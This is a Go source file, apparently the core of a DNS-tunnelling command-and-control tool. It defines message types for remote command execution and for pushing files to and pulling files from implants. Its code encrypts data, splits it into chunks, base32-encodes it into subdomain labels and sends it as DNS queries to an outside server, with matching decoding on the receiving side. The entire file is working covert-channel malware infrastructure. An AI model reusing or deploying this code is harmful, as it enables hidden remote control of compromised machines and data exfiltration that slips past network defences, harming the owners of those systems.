package c2

import (
	"bytes"
	"encoding/base32"
	"math/rand"
	"strings"
	"time"

	"github.com/kpango/glg"
	"github.com/lunixbochs/struc"
	"github.com/miekg/dns"
	"github.com/mosajjal/dnspot/cryptography"
)

type MessageType uint

// Message codes
const (
	MessageHealthcheck       MessageType = 0
	MessageSyncTime          MessageType = 1
	MessageExecuteCommand    MessageType = 2
	MessageSetHealthInterval MessageType = 3
	MessageClientSendFile    MessageType = 4
	MessageClientGetFile     MessageType = 5
	// MessageLogService  Message = 5
)

// healthCheck gets sent by the agent every n seconds
// show that the host is alive and it can receive further instructions
// as part of this healthCheck's response from the server
// note that we'll use the agent's public key as their ID, so no need to put it again here
// also we only have 69 bytes for the entire message if the subdomain is xx.xxx.xx (9 chars)
// multipart system:
// if ParentPartID = 0 -> single packet
// if ParentPartID != 0 -> incoming packets in the order of their PartID
// if IsLastPart == true -> last packet

type MessagePacket struct {
	TimeStamp    uint32      `struc:"uint32,little"`
	MessageType  MessageType `struc:"uint8,little"`
	PartID       uint16      `struc:"uint16,little"`
	ParentPartID uint16      `struc:"uint16,little"`
	IsLastPart   bool        `struc:"bool,little"`
	Payload      [60]byte    `struc:"[60]byte,little"`
}

type MessagePacketWithSignature struct {
	Signature *cryptography.PublicKey
	Msg       MessagePacket
}

func performExternalAQuery(Q string, server string) (*dns.Msg, error) {
	question := dns.Question{Name: Q, Qtype: dns.TypeA, Qclass: dns.ClassINET}
	c := new(dns.Client)
	m1 := new(dns.Msg)
	m1.Id = dns.Id()
	m1.RecursionDesired = true
	m1.Question = make([]dns.Question, 1)
	m1.Question[0] = question
	in, _, err := c.Exchange(m1, server)
	return in, err
}

func insertNth(s string, n int) string {
	var buffer bytes.Buffer
	var n_1 = n - 1
	var l_1 = len(s) - 1
	for i, rune := range s {
		buffer.WriteRune(rune)
		if i%n == n_1 && i != l_1 {
			buffer.WriteRune('.')
		}
	}
	return buffer.String()
}

func split(buf []byte, lim int) [][]byte {
	var chunk []byte
	chunks := make([][]byte, 0, len(buf)/lim+1)
	for len(buf) >= lim {
		chunk, buf = buf[:lim], buf[lim:]
		chunks = append(chunks, chunk)
	}
	if len(buf) > 0 {
		chunks = append(chunks, buf[:len(buf)])
	}
	return chunks
}

func SendPartitionedPayload(msg MessagePacket, payload []byte, dnsSuffix string, serverAddress string, privateKey *cryptography.PrivateKey, serverPublicKey *cryptography.PublicKey) (*dns.Msg, error) {
	// TODO: fix duplicate sending
	var err error
	var response *dns.Msg = nil
	retryCount := 10
	lims := split(payload, 60)
	if len(lims) > 1 {
		msg.IsLastPart = false
		msg.PartID = 0
		rand.Seed(time.Now().UnixNano())
		msg.ParentPartID = uint16(rand.Uint32()) + 1
	}
	for i := 0; i < len(lims); i++ {
		if retryCount == 0 {
			return response, glg.Error("Failed to send message after 10 attempts")
		}
		if i == len(lims)-1 && len(lims) > 1 {
			msg.IsLastPart = true
		}
		msg.Payload = [60]byte{}
		copy(msg.Payload[:], lims[i])
		var buf bytes.Buffer
		buf.Reset()
		struc.Pack(&buf, &msg)
		encrypted, err := cryptography.Encrypt(serverPublicKey, privateKey, buf.Bytes())
		if err != nil {
			return response, glg.Errorf("Failed to encrypt the payload", err)
		}

		s := base32.StdEncoding.EncodeToString(encrypted)
		s = strings.ReplaceAll(s, "=", "")
		Q := insertNth(s, 63) + dnsSuffix
		if len(Q) < 255 {
			response, err = performExternalAQuery(Q, serverAddress)
			if err != nil {
				glg.Warnf("Failed to send the payload %s.. retry no %d", err, 10-retryCount)
				time.Sleep(time.Second * 1)
				i-- //retry
				retryCount--
				// return err
			} else {
				msg.PartID++
			}
		} else {
			glg.Errorf("query is too big %d, can't send this...\n", len(Q))
		}

	}
	return response, err
}

func DecryptIncomingPacket(m *dns.Msg, suffix string, privatekey *cryptography.PrivateKey, publickey *cryptography.PublicKey) ([]MessagePacketWithSignature, error) {
	out := []MessagePacketWithSignature{}
	for _, q := range m.Question {
		if strings.HasSuffix(q.Name, suffix) {

			// verify incoming domain
			requestWithoutSuffix := strings.TrimSuffix(q.Name, suffix)
			if q.Name == requestWithoutSuffix {
				return out, glg.Errorf("invalid request")
			}
			msgRaw := strings.Replace(requestWithoutSuffix, ".", "", -1)
			if i := len(msgRaw) % 8; i != 0 {
				msgRaw += strings.Repeat("=", 8-i)
			}

			msg, err := base32.StdEncoding.DecodeString(msgRaw)
			// glg.Infof("%v %d", msg, len(msg)) // todo:remove
			if err != nil {
				return out, glg.Errorf("invalid base32 input")
			}
			// verify signature
			decrypted, err := cryptography.Decrypt(privatekey, msg)
			if err != nil {
				return out, glg.Errorf("invalid signature")
			}

			// todo: verify authenticity with public key(s)
			o := MessagePacketWithSignature{}
			o.Signature = cryptography.GetPublicKeyFromMessage(msg)
			// glg.Infof("%v", decrypted) // todo:remove
			err = struc.Unpack(bytes.NewBuffer(decrypted), &o.Msg)
			if err != nil {
				return out, glg.Errorf("couldn't unpack message")
			}
			out = append(out, o)
		}
	}
	return out, nil
}
